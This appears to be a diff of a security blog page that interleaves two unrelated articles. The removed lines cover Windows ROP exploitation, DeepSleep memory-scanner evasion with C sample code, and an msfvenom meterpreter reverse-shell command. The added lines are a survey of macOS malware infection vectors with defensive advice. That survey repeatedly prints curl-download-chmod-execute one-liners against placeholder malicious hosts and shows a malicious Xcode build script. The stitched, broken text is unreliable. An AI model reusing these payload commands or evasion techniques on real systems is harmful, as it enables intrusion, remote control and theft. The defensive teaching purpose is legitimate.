+<p class="wp-block-paragraph">A more nuanced approach involves embedding URLs within the email that eventually lead to malicious code. The body of the email entices the user to click on the link, which redirects to a malicious webpage designed to trick the user into downloading and executing malware. Here&#8217;s a simplified example of what such a URL might look like:</p>
 
-#0x50533bf4: sub eax, ecx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x505263f9: push eax ; pop esi ; pop ebx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x5053a0f5: pop eax ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
+<pre class="wp-block-code"><code>&lt;!-- An embedded malicious URL -->
 
-#0x5050626e: add byte &#91;esi+0x3B], ah ; ret&amp;nbsp; ;</code></pre>
+&lt;a href="http://malicious-website.com/download-malware">Click here to view your invoice&lt;/a></code></pre>
 
 
 
-<h4 class="wp-block-heading">DeepSleep</h4>
+<p class="wp-block-paragraph"><strong>Case Study: Dok Malware</strong></p>
 
 
 
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="887" height="270" src="/wp-content/uploads/2024/09/image-14.png" alt="" class="wp-image-8833" srcset="/wp-content/uploads/2024/09/image-14.png 887w, /wp-content/uploads/2024/09/image-14-300x91.png 300w, /wp-content/uploads/2024/09/image-14-768x234.png 768w" sizes="(max-width: 887px) 100vw, 887px" /></figure>
+<p class="wp-block-paragraph">In 2017, the emergence of a Mac malware named Dok showcased the malicious creativity at play. Disguised within an email alerting users of purported inconsistencies in their tax returns, Dok lay concealed within an attachment named Dokument.zip. Once unzipped, the user would find a file designed to mask its malicious nature. Here&#8217;s how Dok was concealed:</p>
 
 
 
-<p class="wp-block-paragraph">DeepSleep is a technique inspired by Gargoyle for x64 environments that utilizes Return-Oriented Programming (ROP) and Position Independent Code (PIC) to hide memory artifacts. The primary goal is to set up a ROP chain that calls <code>VirtualProtect()</code> to modify memory permissions, sleeps, and then resets the memory protection while avoiding detection by memory scanners like Moneta.</p>
+<p class="wp-block-paragraph"># The disguised Dok malware</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong>ROP Chain</strong>: A sequence of carefully crafted gadget calls that allows an attacker to execute arbitrary code while evading detection.</li>
+<p class="wp-block-paragraph">Filename: Tax_Statement.pdf.app</p>
 
 
 
-<li><strong>PIC (Position Independent Code)</strong>: Code that executes properly regardless of its memory address. This is crucial for making the payload stealthy and effective across different environments.</li>
+<p class="wp-block-paragraph">Upon execution, Dok malware would commence its malicious operations, further illustrating the efficacy of email as a malware distribution channel.</p>
 
 
 
-<li><strong>Memory Protection</strong>: The technique involves altering memory protection states to execute the malicious code while minimizing detection risk.</li>
-</ol>
+<p class="wp-block-paragraph"><strong>Counteracting Email Threats</strong></p>
 
 
 
-<h4 class="wp-block-heading">Implementation</h4>
+<p class="wp-block-paragraph">The combat against malicious emails requires a blend of user education, vigilance, and robust security tools capable of scrutinizing email contents. As we delve deeper into this chapter, we will explore various instances where malicious links within emails served as the precursor to multi-step infection vectors, underlining the dynamic nature of email-based threats.</p>
 
 
 
-<p class="wp-block-paragraph"><strong>Prerequisites</strong></p>
+<p class="wp-block-paragraph">This discussion accentuates the imperative for caution when handling email attachments or following embedded links, especially from unknown sources. By fostering a culture of cybersecurity awareness and employing advanced security tools, users can significantly mitigate the risks associated with malicious emails, thus ensuring a safer digital environment on their Mac systems.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Development Environment</strong>: MinGW or a compatible environment to compile the code.</li>
+<p class="wp-block-paragraph"><strong>Fake Tech and Support</strong></p>
 
 
 
-<li><strong>Windows Version</strong>: Tested on Windows 10, version 10.0.19044.</li>
-</ul>
+<p class="wp-block-paragraph">As the internet becomes a ubiquitous part of daily life, it also morphs into a fertile ground for malicious actors aiming to distribute malware. Among the myriad of tactics, fake tech support and counterfeit security alerts have become a formidable method to trick unsuspecting users into infecting their own systems. This article delves into the anatomy of fake tech and support schemes, exploring how they are manifested and how they entice users into a web of deceit.</p>
 
 
 
-<h4 class="wp-block-heading">ROP Chain Construction</h4>
+<p class="wp-block-paragraph"><strong>Pop-Up Menace</strong></p>
 
 
 
-<p class="wp-block-paragraph">The following steps outline how to construct the ROP chain using VirtualProtect, Sleep, and back to VirtualProtect:</p>
+<p class="wp-block-paragraph">A common encounter for Mac users is the sudden appearance of alarming pop-ups while browsing the web. Originating from malicious ads, hijacked search results, or unscrupulous websites employing typosquatting, these pop-ups often masquerade as security alerts or crucial system updates. Here&#8217;s a simplified example of a fake alert:</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong>ROP Gadgets</strong>: Identify the necessary ROP gadgets from <code>ntdll.dll</code>. The gadgets should include:
-<ul class="wp-block-list">
-<li>A gadget to call <code>VirtualProtect()</code>.</li>
+<pre class="wp-block-code"><code>&lt;!-- Fake security alert pop-up -->
 
+&lt;div class="alert">
 
+    Your Mac is infected with 3 viruses! Click here to install AntiVirus MacCleaner now.
 
-<li>A gadget to call <code>Sleep()</code>.</li>
+&lt;/div></code></pre>
 
 
 
-<li>A final gadget to call <code>VirtualProtect()</code> again to revert the memory protection.</li>
-</ul>
-</li>
+<p class="wp-block-paragraph"><strong>Typosquatting: A Case of Homebrew.sh</strong></p>
 
 
 
-<li><strong>Gadget Example</strong>: Here’s how you might find and construct your ROP gadgets.</li>
-</ol>
+<p class="wp-block-paragraph">A prime example of typosquatting occurred in 2020 when cybercriminals registered the domain homebrew.sh, exploiting the popularity of the legitimate package manager Homebrew hosted at brew.sh. Unsuspecting users landing on this fake domain were greeted with fabricated alerts proclaiming their system to be compromised. Here&#8217;s a simplified depiction of such a fake alert:</p>
 
 
 
-<pre class="wp-block-code"><code>!mona rop -m ntdll.dll -cpb '\x00'</code></pre>
+<pre class="wp-block-code"><code>&lt;!-- Fake security alert on homebrew.sh -->
 
+&lt;div class="alert">
 
+    Your system has been blocked for security reasons. Call support at 1-800-XXX-XXXX.
 
-<p class="wp-block-paragraph">This command will help you find the available ROP gadgets in <code>ntdll.dll</code> while excluding null bytes.</p>
+&lt;/div></code></pre>
 
 
 
-<h4 class="wp-block-heading">Sample Code for DeepSleep</h4>
+<p class="wp-block-paragraph">Users lured into calling the provided support number could be further manipulated into installing malicious software, thereby compromising their Macs.</p>
 
 
 
-<p class="wp-block-paragraph">Here&#8217;s a simple example of how to set up the ROP chain for DeepSleep.</p>
+<p class="wp-block-paragraph"><strong>Consequences of Falling Prey</strong></p>
 
 
 
-<pre class="wp-block-code"><code>#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
+<p class="wp-block-paragraph">Once duped, users might find themselves coerced into downloading and executing malicious software. A common aftermath involves remote access tools (RATs) being installed, granting attackers unauthorized access to the victim’s system. Here’s an example of a malicious command that could be executed:</p>
 
-// Function prototype for VirtualProtect
-BOOL VirtualProtect(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD flNewProtect,
-    PDWORD lpflOldProtect
-);
 
-void main() {
-    // Step 1: Prepare the ROP chain
-    // Assuming we have found the following gadgets:
-    // - gadget1: address of VirtualProtect
-    // - gadget2: address of Sleep
-    // - gadget3: address of VirtualProtect again
 
-    // Example addresses for ROP gadgets (replace with actual addresses)
-    ULONG_PTR gadget1 = 0x00000000; // Replace with the actual address for VirtualProtect
-    ULONG_PTR gadget2 = 0x00000000; // Replace with the actual address for Sleep
-    ULONG_PTR gadget3 = 0x00000000; // Replace with the actual address for VirtualProtect
+<p class="wp-block-paragraph"># Example of a malicious command for installing a RAT</p>
 
-    // Step 2: Build the ROP chain
-    // Create a buffer to hold the ROP chain
-    ULONG_PTR ropChain&#91;6];
 
-    // Push necessary values onto the stack for VirtualProtect
-    ropChain&#91;0] = gadget1; // Address of VirtualProtect
-    ropChain&#91;1] = 0x400;   // Size of the page to modify
-    ropChain&#91;2] = PAGE_EXECUTE_READWRITE; // New protection
-    ropChain&#91;3] = NULL; // Old protection placeholder
 
-    // Call Sleep to suspend execution
-    ropChain&#91;4] = gadget2; // Address of Sleep
-    ropChain&#91;5] = 1000; // Sleep for 1000 ms
+<p class="wp-block-paragraph">curl -O http://malicious-domain.com/malicious-file &amp;&amp; chmod +x malicious-file &amp;&amp; ./malicious-file</p>
 
-    // Step 3: Execute the ROP chain
-    // This is where you would normally trigger the ROP chain execution.
 
-    // For demonstration, we will just call the functions directly
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], ropChain&#91;2], (PDWORD)ropChain&#91;3]);
-    Sleep(ropChain&#91;5]);
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], PAGE_READWRITE, (PDWORD)ropChain&#91;3]);
 
-    printf("Executed DeepSleep ROP Chain!\n");
+<p class="wp-block-paragraph"><strong>Fortifying Against Fake Tech and Support Schemes</strong></p>
+
+
+
+<p class="wp-block-paragraph">Awareness is the cornerstone of defense against fake tech and support schemes. Recognizing the hallmarks of such scams, using trusted security software, and maintaining a healthy skepticism towards unsolicited alerts can significantly mitigate the risks posed by these nefarious tactics.</p>
+
+
+
+<p class="wp-block-paragraph">This exploration sheds light on the intricate web spun by malicious actors aiming to exploit the user&#8217;s trust and lack of technical acumen. As the narrative unfolds, it accentuates the imperative for vigilance and education in navigating the digital realm securely, thus safeguarding one’s Mac system from the clutches of fake tech and support schemes.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Fake Updates</strong></p>
+
+
+
+<p class="wp-block-paragraph">Fake update alerts often masquerade as legitimate notifications from reputable software vendors, thus exploiting the user&#8217;s trust. A common guise is the outdated Adobe Flash Player alert. Here’s a simplified representation of such a malicious pop-up:</p>
+
+
+
+<pre class="wp-block-code"><code>&lt;!-- Fake Adobe Flash Player update pop-up -->
+
+&lt;div class="update-alert">
+
+    Your Adobe Flash Player is outdated! Click here to update now.
+
+&lt;/div></code></pre>
+
+
+
+<p class="wp-block-paragraph">Upon clicking, users are led to a malicious webpage disguised as a legitimate download page, offering a fake update that is, in reality, malware.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>The Malicious Payload</strong></p>
+
+
+
+<p class="wp-block-paragraph">The malevolent payload delivered via fake updates can vary, but adware and potentially unwanted programs (PUPs) are common. Here&#8217;s an example of a command that could be used to download and execute the malicious update:</p>
+
+
+
+<p class="wp-block-paragraph"># Example command to download and execute malicious update</p>
+
+
+
+<p class="wp-block-paragraph">curl -O http://malicious-site.com/fake-update &amp;&amp; chmod +x fake-update &amp;&amp; ./fake-update</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Case Study: Shlayer Malware</strong></p>
+
+
+
+<p class="wp-block-paragraph">The Shlayer malware provides a quintessential example of fake updates preying on Mac users. Disguised as a Flash Player update, Shlayer unleashes a barrage of adware onto the victim&#8217;s system once executed. This malware showcases the effectiveness of fake updates in duping users into self-inflicted compromise.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Protecting Against Fake Update Scams</strong></p>
+
+
+
+<p class="wp-block-paragraph">Guarding against fake update scams entails a blend of user education, updated security software, and a healthy dose of skepticism towards unsolicited update prompts. Employing reputable ad-blockers and maintaining software through official channels further bolster the defenses against such deceptive tactics.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Fake Applications</strong></p>
+
+
+
+<p class="wp-block-paragraph">Fake applications thrive on the camouflage of legitimacy, often impersonating popular or essential software. Unlike trojanized applications, which retain the functionality of the original software while harboring malicious code, fake applications primarily serve as a vessel for delivering malicious payloads. Here&#8217;s a simplified example of a fake application&#8217;s code structure:</p>
+
+
+
+<pre class="wp-block-code"><code># A simplistic representation of a fake application's code
+
+#!/bin/bash
+
+# Malicious payload
+
+curl -O http://malicious-domain.com/malicious-file &amp;&amp; chmod +x malicious-file &amp;&amp; ./malicious-file
+
+exit</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Case Study: Siggen Masquerading as WhatsApp</strong></p>
+
+
+
+<p class="wp-block-paragraph">Siggen, a malicious application targeting Mac users, impersonated the widely-used WhatsApp messaging application. The attacker-controlled site, message-whatsapp.com, would entice users to download a ZIP archive named WhatsAppWeb.zip. However, instead of the legitimate WhatsApp application, the archive contained a malicious application named WhatsAppService. Here’s a simplified representation of how the malicious file could be structured within the ZIP archive:</p>
+
+
+
+<p class="wp-block-paragraph"># Inside WhatsAppWeb.zip</p>
+
+
+
+<p class="wp-block-paragraph">WhatsAppService.app/Contents/MacOS/WhatsAppService</p>
+
+
+
+<p class="wp-block-paragraph">Upon executing WhatsAppService, the malicious payload within springs into action, showcasing the effectiveness of fake applications as a malware delivery mechanism.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Detecting and Avoiding Fake Applications</strong></p>
+
+
+
+<p class="wp-block-paragraph">The frontline defense against fake applications lies in meticulous verification of the software source. Downloading applications exclusively from reputable sources such as the Mac App Store or official vendor websites significantly mitigates the risk. Additionally, employing reputable security solutions capable of identifying and blocking fake applications further fortifies the defense against such deceptive tactics.</p>
+
+
+
+<h2 class="wp-block-heading" id="h-trojanized-applications"><strong>Trojanized Applications</strong></h2>
+
+
+
+<p class="wp-block-paragraph">Let’s traverse the malicious journey through the lens of an employee enticed to try a new cryptocurrency trading application named JMTTrader. The setup is meticulously crafted, from a persuasive email to a professional-looking website hosting the download link for JMTTrader. Yet, beneath the polished exterior lurks a nefarious intent.</p>
+
+
+
+<p class="wp-block-paragraph">Upon downloading, installing, and executing JMTTrader, everything appears as anticipated. The application unfolds a platform to interact with various cryptocurrency exchanges. However, the semblance of normalcy is but a smokescreen. Unbeknownst to the user, the prebuilt installer of JMTTrader.app harbors a malicious backdoor that quietly installs its own backdoor during the installation process. Here&#8217;s a simplified representation of how the backdoor might operate:</p>
+
+
+
+<pre class="wp-block-code"><code># Hypothetical command sequence illustrating the backdoor operation
+
+#!/bin/bash
+
+# The backdoor quietly downloads and executes additional malicious payload
+
+curl -O http://malicious-domain.com/backdoor-payload &amp;&amp; chmod +x backdoor-payload &amp;&amp; ./backdoor-payload</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Lazarus APT Group: Masters of Trojanized Tactics</strong></p>
+
+
+
+<p class="wp-block-paragraph">This sinister plot is not a fictional scenario but a meticulously crafted attack attributed to the notorious Lazarus APT Group. Known for their sophisticated, multifaceted social engineering tactics, Lazarus has been employing Trojanized applications as a vector to infiltrate Mac systems since 2018. The Trojanized JMTTrader application serves as a testament to their nefarious ingenuity, seamlessly blending malicious intent with seemingly legitimate digital offerings.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Guarding Against Trojanized Applications</strong></p>
+
+
+
+<p class="wp-block-paragraph">Defending against Trojanized applications necessitates a multi-pronged approach. Vigilance in verifying the source of software downloads, coupled with employing reputable security solutions capable of identifying and thwarting Trojanized applications, forms the bedrock of a robust defense strategy. Additionally, scrutinizing any unsolicited communications and adhering to a principle of least privilege can significantly mitigate the risks posed by Trojanized applications.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Pirated and Cracked Applications</strong></p>
+
+
+
+<p class="wp-block-paragraph">The allure of obtaining high-cost software for free is the bait that draws users into the trap. By cracking popular software like Adobe Photoshop or Microsoft Office, attackers offer a seemingly irresistible proposition. However, the hidden cost is far greater than the saved licensing fee. Here&#8217;s a simplified representation of malicious code injection in a cracked application:</p>
+
+
+
+<p class="wp-block-paragraph"># Hypothetical malicious code injection in a cracked application</p>
+
+
+
+<p class="wp-block-paragraph">#!/bin/bash</p>
+
+
+
+<p class="wp-block-paragraph"># Malicious payload hidden within the cracked software</p>
+
+
+
+<p class="wp-block-paragraph">curl -O http://malicious-domain.com/malicious-file &amp;&amp; chmod +x malicious-file &amp;&amp; ./malicious-file</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Case Studies: iWorm, BirdMiner, and LoudMiner</strong></p>
+
+
+
+<p class="wp-block-paragraph">The iWorm malware, spread via pirated versions of coveted OS X applications, serves as a stark reminder of the dangers lurking within cracked software. Similarly, the BirdMiner and LoudMiner malware, disseminated through pirated applications on the VST Crack website, exemplify the insidious nature of this attack vector.</p>
+
+
+
+<p class="wp-block-paragraph">In the case of BirdMiner, attackers concealed the malware within a cracked installer for the high-end music production software Ableton Live. Here&#8217;s a simplified depiction of how BirdMiner could be structured within a pirated application:</p>
+
+
+
+<p class="wp-block-paragraph"># Inside the cracked Ableton Live installer</p>
+
+
+
+<p class="wp-block-paragraph">BirdMiner.app/Contents/MacOS/BirdMiner</p>
+
+
+
+<p class="wp-block-paragraph">Once executed, the malicious payload springs into action, transforming the victim&#8217;s system into a cog in the attacker&#8217;s nefarious machine.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Defending Against Pirated Software Threats</strong></p>
+
+
+
+<p class="wp-block-paragraph">Safeguarding against the threats embedded within pirated and cracked software is straightforward—avoid them. Adhering to legal software acquisition channels and employing reputable security solutions form a robust defensive perimeter. Additionally, cultivating a culture of cybersecurity awareness can significantly mitigate the risks associated with pirated software.</p>
+
+
+
+<h2 class="wp-block-heading" id="h-custom-url-schemes"><strong>Custom URL Schemes</strong></h2>
+
+
+
+<p class="wp-block-paragraph">WindTail, a sinister piece of malware, unfolds its infection campaign by first luring victims to a malicious webpage. This webpage triggers an automatic download of a ZIP archive encapsulating the malware. With Safari&#8217;s default setting to open &#8220;safe&#8221; files post-download, the archive is promptly extracted, setting the stage for the next phase of the attack.</p>
+
+
+
+<p class="wp-block-paragraph">The extraction is pivotal as macOS processes any application saved to disk, which in this scenario includes registering the application as a URL handler if it supports custom URL schemes. The following commands outline a simplified way to check an application&#8217;s supported URL schemes by examining its Info.plist file:</p>
+
+
+
+<pre class="wp-block-code"><code># Unzip the application archive
+
+unzip ~/Downloads/Final_Presentation.app.zip -d ~/Downloads/
+
+# Navigate to the application's directory
+
+cd ~/Downloads/Final_Presentation.app/Contents/
+
+# Display the contents of Info.plist
+
+cat Info.plist</code></pre>
+
+
+
+<p class="wp-block-paragraph">Inside the Lair: Dissecting WindTail&#8217;s Custom URL Scheme</p>
+
+
+
+<p class="wp-block-paragraph">A close examination of WindTail&#8217;s Info.plist unveils a custom URL scheme: openurl2622007. Once Safari extracts the application, macOS&#8217;s launch services daemon (lsd) registers this scheme, mapping it to the malicious application. The fs_usage command can be employed to observe lsd&#8217;s file actions:</p>
+
+
+
+<p class="wp-block-paragraph"># Monitor file I/O events associated with the launch services daemon (lsd)</p>
+
+
+
+<pre class="wp-block-code"><code>sudo fs_usage -w -f filesystem lsd</code></pre>
+
+
+
+<p class="wp-block-paragraph">Now, with the malicious application registered as the handler for the openurl2622007 scheme, a mere invocation of this URL scheme from the malicious webpage activates the malware. The proof-of-concept code depicted in the article illustrates how this entire orchestration unfolds seamlessly, from downloading the malicious archive to launching the malware via the custom URL scheme.</p>
+
+
+
+<p class="wp-block-paragraph">A Veil of Legitimacy: The User Prompt Deception</p>
+
+
+
+<p class="wp-block-paragraph">Though Safari and macOS present alerts regarding the webpage&#8217;s attempt to launch an application, the malicious naming (like Final_Presentation) can deceive users into permitting the action, consequently unleashing the malware onto their system.</p>
+
+
+
+<h2 class="wp-block-heading" id="h-office-macros"><strong>Office Macros</strong></h2>
+
+
+
+<p class="wp-block-paragraph">Microsoft Office macros are scripts or sequences of instructions that can be embedded within Office documents, such as Word, Excel, or PowerPoint files, to automate repetitive tasks or complex workflows. They&#8217;re typically written in a language called Visual Basic for Applications (VBA). While they can be used for legitimate purposes, they also provide an avenue for malicious actors to embed malware within Office documents. When a user opens a document containing malicious macros and enables macros (as they&#8217;re often disabled by default for security reasons), the malicious code within the macro can execute on the user&#8217;s system.</p>
+
+
+
+<p class="wp-block-paragraph">Macros can be quite simplistic, yet they&#8217;ve become a popular method of delivering malware, including to Mac users, especially as Microsoft Office&#8217;s popularity on macOS has grown. This has coincided with the increased adoption of macOS in enterprise environments. The Lazarus Advanced Persistent Threat (APT) Group, for instance, utilized macro-based attacks targeting Mac users in 2019, demonstrating the effectiveness of this method.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>In a typical macro-based attack:</strong></p>
+
+
+
+<p class="wp-block-paragraph"><strong>Infection Vector:</strong></p>
+
+
+
+<p class="wp-block-paragraph">The user receives a document containing malicious macros, often via email.</p>
+
+
+
+<p class="wp-block-paragraph">The document often contains social engineering tricks to persuade the user to enable macros, which is usually required for the malicious code to execute.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Execution</strong>:</p>
+
+
+
+<p class="wp-block-paragraph">Once macros are enabled, the malicious code within the macro executes.</p>
+
+
+
+<p class="wp-block-paragraph">Commonly used VBA methods for ensuring execution include AutoOpen and Document_Open, which trigger the macro as soon as the document is opened and macros are enabled.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Malicious Actions:</strong></p>
+
+
+
+<p class="wp-block-paragraph">The malicious code might download additional malware from a remote server, create persistence mechanisms to remain on the system, exfiltrate data, or perform other malicious actions.</p>
+
+
+
+<p class="wp-block-paragraph">In the provided code snippet, a malicious macro targets Mac users specifically. When executed, this macro:</p>
+
+
+
+<p class="wp-block-paragraph">Initializes variables and generates a random path within the /tmp directory.</p>
+
+
+
+<p class="wp-block-paragraph">Uses curl to download a malicious payload from a remote server.</p>
+
+
+
+<p class="wp-block-paragraph">Sets the downloaded file to be executable using chmod.</p>
+
+
+
+<p class="wp-block-paragraph">Executes the downloaded file using popen, which in this case, is a persistent macOS backdoor.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Security Measures:</strong></p>
+
+
+
+<p class="wp-block-paragraph">To mitigate the risks associated with malicious macros, Microsoft introduced a sandbox environment from Office 2016 onwards on macOS. This sandbox is designed to limit the impact of malicious code executed via macros by restricting its access to the system.</p>
+
+
+
+<p class="wp-block-paragraph">However, there have been instances where security researchers found ways to escape this sandbox, highlighting the continued risk associated with macros.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Tools for Analysis:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Tools like olevba can be used to extract and analyze macro code from Office documents. This can be crucial for cybersecurity analysts to understand the behavior of malicious macros and develop countermeasures.</p>
+
+
+
+<h2 class="wp-block-heading" id="h-xcode-projects"><strong>Xcode Projects</strong></h2>
+
+
+
+<p class="wp-block-paragraph">XCSSET cleverly disguises itself within Xcode projects. When an unsuspecting developer downloads and builds an XCSSET-infested Xcode project, the malicious script tucked within springs into action, infecting the developer&#8217;s Mac and laying the groundwork for data theft.</p>
+
+
+
+<p class="wp-block-paragraph">Here’s a simplified breakdown of the malicious build script found within an infected Xcode project’s project.pbxproj file:</p>
+
+
+
+<pre class="wp-block-code"><code># Navigating to the hidden directory
+
+cd "${PROJECT_FILE_PATH}/xcuserdata/.xcassets/"
+
+# Preparing the xcassets binary for execution
+
+xattr -c "xcassets"
+
+chmod +x "xcassets"
+
+# Executing the binary
+
+./xcassets "${PROJECT_FILE_PATH}" true</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Anatomy of the Attack</strong></p>
+
+
+
+<p class="wp-block-paragraph">The script unveils a well-orchestrated malicious ballet:</p>
+
+
+
+<p class="wp-block-paragraph">Navigation to Hidden Lair: The script navigates to a hidden directory /.xcassets/ nestled within the project’s directory structure.</p>
+
+
+
+<p class="wp-block-paragraph">Preparation for Execution: It then prepares the malicious xcassets binary for execution by stripping any extended attributes and marking it as executable.</p>
+
+
+
+<p class="wp-block-paragraph">Execution of Malice: Finally, the script executes the xcassets binary, passing along crucial arguments including the path to the project.</p>
+
+
+
+<p class="wp-block-paragraph">This malicious endeavor culminates in the core XCSSET malware being unleashed onto the system, paving the way for an extensive data heist encompassing credentials and other vital information.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Implications and Countermeasures</strong></p>
+
+
+
+<p class="wp-block-paragraph">The sophistication of XCSSET underscores the dire need for vigilance, even within the seemingly safe havens of development environments. Developers are urged to exercise caution by:</p>
+
+
+
+<p class="wp-block-paragraph">Verifying the integrity of Xcode projects before downloading.</p>
+
+
+
+<p class="wp-block-paragraph">Employing reputable security solutions capable of identifying and thwarting such malicious intrusions.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Supply Chain Attacks</strong></p>
+
+
+
+<p class="wp-block-paragraph">Supply Chain Attacks target the infrastructure involved in the development and distribution of software. By compromising legitimate websites or developer tools, the attackers plant malicious code within trusted software, making detection exceedingly difficult. Here are two notable instances illustrating the magnitude of such attacks:</p>
+
+
+
+<p class="wp-block-paragraph"><strong>HandBrake Heist:</strong></p>
+
+
+
+<p class="wp-block-paragraph">In 2017, the official website of the widely-used video transcoder application, HandBrake, fell victim to a supply chain attack. The adversaries re-packaged the legitimate HandBrake application embedding their malicious payload named Proton within it. This Trojan horse then rode its way into the systems of unsuspecting users who downloaded the application from the official site.</p>
+
+
+
+<p class="wp-block-paragraph">Command-Line Verification of Download Integrity (Illustrative Example):</p>
+
+
+
+<p class="wp-block-paragraph"># Download HandBrake from the official site</p>
+
+
+
+<p class="wp-block-paragraph">curl -O https://handbrake.fr/rotation.php?file=HandBrake-1.3.3.dmg</p>
+
+
+
+<p class="wp-block-paragraph"># Verify the integrity of the downloaded file using a checksum</p>
+
+
+
+<p class="wp-block-paragraph">shasum -a 256 HandBrake-1.3.3.dmg</p>
+
+
+
+<p class="wp-block-paragraph">MacUpdate Mayhem:</p>
+
+
+
+<p class="wp-block-paragraph">In 2018, the popular Mac application repository, macupdate.com, was targeted. The attackers manipulated the download links of prominent applications like Firefox, redirecting users to Trojanized versions laden with the CreativeUpdate malware.</p>
+
+
+
+<p class="wp-block-paragraph">Code Snippet to Check Download URL (Illustrative Example):</p>
+
+
+
+<p class="wp-block-paragraph"># Extract the actual download URL using curl</p>
+
+
+
+<p class="wp-block-paragraph">curl -I https://www.macupdate.com/app/mac/10700/firefox | grep -i &#8220;location&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Implications and Countermeasures</strong></p>
+
+
+
+<p class="wp-block-paragraph">The nefariousness of supply chain attacks lies in their ability to bypass traditional security measures, exploiting the trust users have in official software repositories. The introduction of application notarization requirements in macOS 10.15+ is a step towards mitigating such threats. This feature ensures that all software undergoes a scrutiny process by Apple before being allowed to run on macOS.</p>
+
+
+
+<p class="wp-block-paragraph">However, this is not a silver bullet, and vigilance is paramount:</p>
+
+
+
+<p class="wp-block-paragraph">Developers and distributors must employ rigorous security practices to guard against infrastructure compromise.</p>
+
+
+
+<p class="wp-block-paragraph">End-users should maintain a healthy skepticism even towards official software sources, verifying download integrity whenever possible.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Account Compromises of Remote Services</strong></p>
+
+
+
+<p class="wp-block-paragraph">macOS users often enable remote services like Remote Desktop Protocol (RDP), SSH (Secure Shell), or Apple Filing Protocol (AFP) for legitimate remote access or content sharing. However, misconfigurations or weak authentication practices can turn these services into gateways for malware.</p>
+
+
+
+<p class="wp-block-paragraph">Example Command: Checking for open SSH port on macOS</p>
+
+
+
+<p class="wp-block-paragraph">nmap -p 22 &lt;IP_Address&gt;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Password Perniciousness:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Weak or reused passwords are a goldmine for attackers. By employing brute force attacks or leveraging passwords leaked from third-party data breaches, attackers can gain unauthorized access to these services.</p>
+
+
+
+<p class="wp-block-paragraph">Example Command: Setting up a strong password on macOS</p>
+
+
+
+<p class="wp-block-paragraph">passwd &lt;username&gt;</p>
+
+
+
+<p class="wp-block-paragraph">Infamous Incidents:</p>
+
+
+
+<p class="wp-block-paragraph"><strong>1. FruitFly Fiasco:</strong></p>
+
+
+
+<p class="wp-block-paragraph">In 2018, an FBI report unveiled the mystery behind the infection vector of the notorious FruitFly malware on macOS. The malware exploited externally facing services like AFP, RDP, SSH, and Back to My Mac (BTMM), targeting them with weak or breached passwords.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>2. IPStorm Invasion:</strong></p>
+
+
+
+<p class="wp-block-paragraph">In 2020, the IPStorm malware, initially designed for Windows and Linux, was ported to macOS. It targets remote systems with SSH enabled, employing brute force attacks to guess valid credentials, following which it downloads and executes a malicious payload on the compromised system.</p>
+
+
+
+<pre class="wp-block-code"><code>Snippet from IPStorm’s Code (Remote Infection Logic):
+
+int ssh.InstallPayload(...) {
+
+ ssh.SystemInfo.GoArch(...);
+
+ statik.GetFileContents(...);
+
+ ssh.(*Session).Start(...);
+
 }</code></pre>
 
 
 
-<p class="wp-block-paragraph">While DeepSleep aims to evade detection, certain behaviors may still be flagged by security tools. For instance, calling <code>VirtualProtect()</code> repeatedly may leave traces in the call stack that security tools can identify. It&#8217;s crucial to continuously assess and adapt the technique to stay ahead of detection mechanisms.</p>
+<p class="wp-block-paragraph"><strong>Defensive Measures:</strong></p>
 
 
 
-<h3 class="wp-block-heading">ROPDecoder</h3>
+<p class="wp-block-paragraph">Password Hygiene: Employ strong, unique passwords and consider enabling multi-factor authentication where possible.</p>
 
 
 
-<p class="wp-block-paragraph">The <strong>ROPDecoder</strong> is essential in bypassing restrictions like <strong>Data Execution Prevention (DEP)</strong> when executing shellcode. It facilitates the modification of &#8220;bad characters&#8221; that can crash the exploit when executed. These bad characters typically include control characters and null bytes that disrupt the execution flow.</p>
+<p class="wp-block-paragraph">Regular Audits: Conduct regular security audits to identify and rectify misconfigurations in remote services.</p>
 
 
 
-<p class="wp-block-paragraph">by https://zeyadazima.com/exploit%20development/ropdecoder/</p>
+<p class="wp-block-paragraph">Patch Management: Ensure that the operating system and all applications are updated to the latest security patches.</p>
 
 
 
-<h4 class="wp-block-heading">Why Do We Need ROPDecoder?</h4>
+<p class="wp-block-paragraph"><strong>Exploits</strong></p>
 
 
 
-<ol class="wp-block-list">
-<li><strong>Bad Character Issues</strong>: When using tools like <code>msfvenom</code>, bad characters are specified with the <code>-b</code> argument (e.g., <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=1337 -b "\x00\x20\x21"</code>). The shellcode gets encoded to avoid these characters.</li>
